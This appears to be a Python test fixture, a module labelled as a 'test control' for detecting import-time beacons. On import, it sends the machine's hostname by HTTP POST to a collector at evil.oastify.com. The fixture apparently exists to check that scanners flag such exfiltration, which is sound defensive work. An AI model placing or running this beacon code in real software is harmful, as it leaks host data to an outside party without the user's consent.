"""Module-scope OOB host-profile beacon (test control).

The POST runs when the module is imported, carrying the local hostname to
an OOB collector. Must keep firing the import-time beacon composite.
"""
import socket

import requests

HOST = socket.gethostname()
requests.post("https://evil.oastify.com/collect", json={"host": HOST})
